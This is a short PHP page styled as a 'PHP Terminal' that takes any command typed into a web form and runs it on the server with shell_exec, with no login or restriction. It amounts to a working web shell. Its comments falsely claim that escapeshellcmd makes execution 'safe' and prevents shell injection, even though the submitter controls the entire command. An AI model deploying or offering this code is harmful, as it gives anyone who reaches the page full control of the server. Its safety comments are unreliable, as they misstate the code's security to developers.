<?php
// run_command.php

// Function to safely execute shell commands
function execute_command($command) {
    // Escape the command to prevent shell injection
    $command = escapeshellcmd($command);

    // Execute the command
    $output = shell_exec($command);

    // Return the output
    return "<pre>$output</pre>";
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Terminal</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background-color: #121212;
            color: #33ff33;
            padding: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            background-color: #333;
            color: #fff;
            border: none;
            border-radius: 5px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #333;
            color: #fff;
            padding: 15px;
            border-radius: 5px;
            overflow: auto;
        }
    </style>
</head>
<body>

    <h1>PHP Terminal</h1>
    <form method="POST">
        <label for="command">Enter Command:</label>
        <input type="text" name="command" id="command" placeholder="Type your command here..." required />
        <input type="submit" value="Execute" />
    </form>

    <div>
        <?php
        // Check if a command is submitted
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
            // Get the command from the form
            $command = $_POST['command'];

            // Execute the command and display the output
            echo execute_command($command);
        }
        ?>
    </div>

</body>
</html>
